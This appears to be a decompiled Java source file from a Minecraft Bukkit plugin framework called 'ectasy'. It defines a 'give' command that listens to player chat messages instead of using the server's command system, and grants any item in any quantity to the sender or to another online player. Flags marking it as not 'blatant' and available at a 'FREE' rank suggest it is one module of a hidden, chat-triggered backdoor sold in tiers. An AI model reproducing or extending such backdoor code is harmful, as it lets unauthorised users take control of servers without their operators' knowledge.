package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;

@CommandInfo(
   name = "give",
   description = "Gives you any item",
   blatant = false,
   rank = Rank.FREE
)
public class GiveCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Usage: give <item>");
      } else {
         Player var4 = var1.getPlayer();
         String var5 = var3[0];
         int var6 = 1;
         if (var3.length > 1) {
            var4 = Bukkit.getPlayer(var3[0]);
            if (var4 == null) {
               ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " is not online.");
               return;
            }

            var5 = var3[1];
         }

         if (var3.length == 3) {
            try {
               var6 = Integer.parseInt(var3[2]);
            } catch (Exception var8) {
               ChatUtil.sendChat(var1.getPlayer(), "Amount provided is not an integer");
               return;
            }
         }

         Material var7 = Material.getMaterial(var5.toUpperCase());
         if (var7 == null) {
            ChatUtil.sendChat(var1.getPlayer(), "Item not found!");
         } else {
            var4.getInventory().addItem(new ItemStack(var7, var6));
            ChatUtil.sendChat(var1.getPlayer(), "Gave the item");
         }
      }
   }
}
